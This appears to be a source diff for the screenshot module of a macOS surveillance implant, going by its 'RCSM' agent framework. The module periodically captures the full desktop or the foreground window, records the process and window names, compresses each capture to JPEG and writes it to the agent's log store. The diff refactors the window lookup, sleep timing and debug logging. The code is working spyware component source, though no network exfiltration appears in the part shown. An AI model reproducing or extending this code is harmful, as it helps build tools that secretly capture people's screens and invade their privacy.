@@ -11,6 +11,7 @@
 
 #import "RCSMAgentScreenshot.h"
 
+#import "RCSMCommon.h"
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
@@ -21,84 +22,15 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 
 @interface RCSMAgentScreenshot (hidden)
 
-- (NSDictionary *)getActiveWindowInformation;
 - (BOOL)_grabScreenshot: (BOOL)entireDesktop;
 
 @end
 
 @implementation RCSMAgentScreenshot (hidden)
 
-- (NSDictionary *)getActiveWindowInformation
-{
-  ProcessSerialNumber psn = { 0,0 };
-  NSDictionary *activeAppInfo;
-  
-  OSStatus success;
-  
-  CFArrayRef windowsList;
-  int windowPID;
-  pid_t pid;
-  
-  NSNumber *windowID    = nil;
-  NSString *processName = nil;
-  NSString *windowName  = nil;
-  
-  // Active application on workspace
-  activeAppInfo =  [[NSWorkspace sharedWorkspace] activeApplication];
-  psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
-                       unsignedIntValue];
-  psn.lowLongOfPSN  = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberLow"]
-                       unsignedIntValue];
-  
-  // Get PID of the active Application(s)
-  if (success = GetProcessPID(&psn, &pid) != 0)
-    return nil;
-  
-  // Window list front to back
-  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
-                                           kCGNullWindowID);
-  
-  if (windowsList == NULL)
-    return nil;
-  
-  for (NSMutableDictionary *entry in (NSArray *)windowsList)
-    {
-      windowPID = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
-      
-      if (windowPID == pid)
-        {
-          windowID    = [NSNumber numberWithUnsignedInt:
-                         [[[entry objectForKey: (id)kCGWindowNumber] retain] unsignedIntValue]];
-          processName = [[entry objectForKey: (id)kCGWindowOwnerName] copy];
-          windowName  = [[entry objectForKey: (id)kCGWindowName] copy];
-          break;
-        }
-    }
-  CFRelease(windowsList);
-  
-  if (windowPID != pid)
-    return nil;
-  
-  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
-                                             @"processName",
-                                             @"windowName",
-                                             nil];
-  NSArray *objects = [NSArray arrayWithObjects: windowID,
-                                                processName,
-                                                windowName,
-                                                nil];
-  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
-                                                           forKeys: keys];
-  
-  [windowID release];
-  [processName release];
-  [windowName release];
-  
-  return windowInfo;
-}
-
 - (BOOL)_grabScreenshot: (BOOL)entireDesktop
 {
+  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   screenshotAdditionalStruct *agentAdditionalHeader;
   
   CGImageRef screenShot;
@@ -109,15 +41,23 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
   
   if (entireDesktop == YES) 
     {
+#ifdef DEBUG_SCREENSHOT
+      infoLog(@"Grabbing entire desktop");
+#endif
+
       screenShot = CGWindowListCreateImage(CGRectInfinite,
                                            kCGWindowListOptionOnScreenOnly,
                                            kCGNullWindowID,
                                            kCGWindowImageDefault);
-      processName = @"Desktop";
-      windowName  = @"Desktop";
-    } 
+      processName = [[NSString alloc] initWithString: @"Desktop"];
+      windowName  = [[NSString alloc] initWithString: @"Desktop"];
+    }
   else 
     {
+#ifdef DEBUG_SCREENSHOT
+      infoLog(@"Grabbing foreground windows");
+#endif
+
       NSDictionary *windowInfo;
       
       //
@@ -126,11 +66,21 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
       //
       sleep(1);
       
-      if ((windowInfo = [self getActiveWindowInformation]) == nil)
-        return NO;
+      if ((windowInfo = getActiveWindowInfo()) == nil)
+        {
+#ifdef DEBUG_SCREENSHOT
+          errorLog(@"Error while getting active window info");
+#endif
+          return NO;
+        }
       
       if ([[windowInfo objectForKey: @"windowID"] unsignedIntValue] == 0)
-        return NO;
+        {
+#ifdef DEBUG_SCREENSHOT
+          errorLog(@"windowID is empty");
+#endif
+          return NO;
+        }
       
       screenShot = CGWindowListCreateImage(CGRectNull,
                                            kCGWindowListOptionIncludingWindow,
@@ -140,11 +90,13 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
       processName = [[windowInfo objectForKey: @"processName"] retain];
       windowName  = [[windowInfo objectForKey: @"windowName"] retain];
       
-      [windowInfo release];
+      //[windowInfo release];
     }
   
   if (screenShot == NULL)
-    return NO;
+    {
+      return NO;
+    }
   
   bitmapRep = [[NSBitmapImageRep alloc] initWithCGImage: screenShot];
   NSData *tempData = [bitmapRep representationUsingType: NSJPEGFileType
@@ -176,7 +128,7 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
                                  withBytes: [[windowName dataUsingEncoding: NSUTF16LittleEndianStringEncoding] bytes]];
   
 #ifdef DEBUG_SCREENSHOT
-  infoLog(@"additionalHeader: %@", rawAdditionalHeader);
+  verboseLog(@"additionalHeader: %@", rawAdditionalHeader);
 #endif
   RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
   
@@ -192,9 +144,12 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
       if ([logManager writeDataToLog: imageData
                             forAgent: AGENT_SCREENSHOT
                            withLogID: 0] == TRUE)
+        {
 #ifdef DEBUG_SCREENSHOT
-        infoLog(@"data written correctly");
-#endif
+          infoLog(@"data written correctly");
+#endif        
+        }
+
       [logManager closeActiveLog: AGENT_SCREENSHOT
                        withLogID: 0];
     }
@@ -205,6 +160,7 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
   [processName release];
   [windowName release];
   
+  [outerPool release];
   return YES;
 }
 
@@ -288,8 +244,14 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
   infoLog(@"Agent screenshot started");
 #endif
   
-  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
-  //int dwTag = [[mAgentConfiguration objectForKey: @"dwTag"] intValue];
+  [mAgentConfiguration setObject: AGENT_RUNNING
+                          forKey: @"status"];
+  screenshotStruct *screenshotRawData;
+  screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
+  mSleepSec = screenshotRawData->sleepTime;
+  BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0) 
+                           ? TRUE : FALSE;
+
 #ifdef DEBUG_SCREENSHOT
   infoLog(@"AgentConf: %@", mAgentConfiguration);
 #endif
@@ -298,12 +260,6 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      screenshotStruct *screenshotRawData;
-      screenshotRawData = (screenshotStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
-      
-      int sleepTime = screenshotRawData->sleepTime;
-      BOOL grabEntireDesktop = (screenshotRawData->grabActiveWindow == 0) 
-                                  ? TRUE : FALSE;
       
       if ([self _grabScreenshot: grabEntireDesktop] == YES)
         {
@@ -319,11 +275,18 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
         }
       
       [innerPool release];
-      sleep(sleepTime);
+#ifdef DEBUG_SCREENSHOT
+      infoLog(@"Sleeping for %d seconds", mSleepSec);
+#endif
+      
+      sleep(mSleepSec);
     }
   
   if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP)
     {
+#ifdef DEBUG_SCREENSHOT
+      warnLog(@"Terminating Agent Screenshot");
+#endif
       [mAgentConfiguration setObject: AGENT_STOPPED
                               forKey: @"status"];
     }
@@ -334,15 +297,19 @@ static RCSMAgentScreenshot *sharedAgentScreenshot = nil;
 - (BOOL)stop
 {
   int internalCounter = 0;
+
+#ifdef DEBUG_SCREENSHOT
+  infoLog(@"Agent Screenshot Stop called");
+#endif
   
   [mAgentConfiguration setObject: AGENT_STOP
                           forKey: @"status"];
   
   while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
-         && internalCounter <= MAX_STOP_WAIT_TIME)
+         && internalCounter <= mSleepSec)
     {
       internalCounter++;
-      usleep(100000);
+      sleep(1);
     }
   
   return YES;
